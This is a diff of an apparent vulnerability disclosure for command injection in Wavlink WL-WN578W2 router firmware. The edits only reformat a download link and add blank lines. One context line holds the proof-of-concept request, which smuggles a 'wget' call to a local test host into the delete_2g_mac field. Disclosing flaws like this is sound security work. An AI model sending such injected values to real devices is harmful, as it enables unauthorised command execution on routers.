@@ -8,7 +8,7 @@ Version：V221110
 
 Vulnerability: Command Injection
 
-Download：[https://docs.wavlink.xyz/Firmware_ch/?category=%E5%AE%A4%E5%86%85%E4%B8%AD%E7%BB%A7%E5%99%A8&model=WL-WN579X3-C](https://docs.wavlink.xyz/Firmware_ch/?category=%E5%AE%A4%E5%86%85%E4%B8%AD%E7%BB%A7%E5%99%A8&model=WL-WN578W2)
+Download：https://docs.wavlink.xyz/Firmware_ch/?category=%E5%AE%A4%E5%86%85%E4%B8%AD%E7%BB%A7%E5%99%A8&model=WL-WN578W2
 
 Author：Li Tengzheng
 
@@ -57,6 +57,7 @@ page=Delete_Mac_list&delete_list=&delete_2g_mac=;wget 192.168.6.1:6666/testpoc
 ## Result
 
 <div  align="center"><img src="./img/poc1.png" style="zoom:80%;" /></div>
+
 
 
 
